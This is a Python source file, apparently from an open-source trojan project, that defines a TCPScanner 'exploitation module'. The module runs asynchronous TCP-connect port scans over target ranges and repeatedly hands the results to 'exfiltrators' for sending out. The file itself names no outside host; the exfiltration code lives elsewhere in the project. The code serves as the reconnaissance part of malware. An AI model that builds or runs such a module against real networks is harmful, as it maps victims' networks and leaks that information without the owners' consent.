#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = 'EONRaider @ keybase.io/eonraider'

import asyncio
import json
import time
from collections import defaultdict
from ipaddress import IPv4Network
from typing import Collection, Union

from src.modules.exploitation.exploitation_module import ExploitationModule


class TCPScanner(ExploitationModule):
    def __init__(self, *,
                 targets: Union[str, Collection[str]],
                 ports: Collection[int],
                 timeout: float,
                 exfil_time: float = None):
        """Perform asynchronous TCP-connect scans on collections of
        target hosts and ports and send the results to pre-configured
        exfiltration methods.

        Args:
            targets: A string defining a CIDR range or a collection of
                strings containing a sequence of IP addresses and/or
                domain names.
            ports: A collection of integers containing a sequence of
                valid port numbers as defined by IETF RFC 6335.
            timeout: Time to wait for a response from a target before
                closing a connection to it.
            exfil_time: Time in seconds to wait between periodic
                executions of the exfiltration of scan results. Set to
                None to perform a single operation.
        """

        super().__init__(exfil_time)
        self.targets = targets
        self.ports = ports
        self.timeout = timeout
        self.results = defaultdict(dict)
        self._loop = asyncio.get_event_loop()

    async def _scan(self, host: str, port: int) -> None:
        """Perform a TCP handshake on a target socket."""
        try:
            '''A successful handshake completes the connection without 
            errors. Different results raise exceptions related to the 
            reason for a failed connection. The port number, its state 
            and the reason why the state was assigned are added to the 
            'results' dictionary.'''
            await asyncio.wait_for(
                fut=asyncio.open_connection(host, port, loop=self._loop),
                timeout=self.timeout)
            port_state, reason = 'open', 'SYN/ACK'
        except (ConnectionRefusedError, asyncio.TimeoutError, OSError) as e:
            reasons = {
                'ConnectionRefusedError': 'Connection refused',
                'TimeoutError': 'No response',
                'OSError': 'Network error'
            }
            port_state, reason = 'closed', reasons[e.__class__.__name__]
        '''The 'results' dictionary is formatted as JSON. Ex:
        {'192.168.0.10': {22: ('closed', 'Connection refused'),
                          80: ('open', 'SYN/ACK')}}'''
        self.results[host].update({port: (port_state, reason)})

    @property
    def targets(self):
        return self._targets

    @targets.setter
    def targets(self, value):
        if issubclass(value.__class__, Collection):
            self._targets = value
        elif isinstance(value, str) and "/" in value:
            self._targets = {str(ip) for ip in IPv4Network(value)}
        else:
            raise TypeError(f"Invalid type for definition of targets: "
                            f"{type(value)}")

    @property
    def contents(self) -> str:
        return json.dumps(self.results)

    def execute(self):
        """Execute the scan and notify all registered exfiltrators."""
        while True:
            scan_tasks = [self._scan(target, port) for port in self.ports
                          for target in self.targets]
            self._loop.run_until_complete(asyncio.wait(scan_tasks))
            self._notify_all_exfiltrators()
            try:
                time.sleep(self.exfil_time)
            except TypeError:
                break
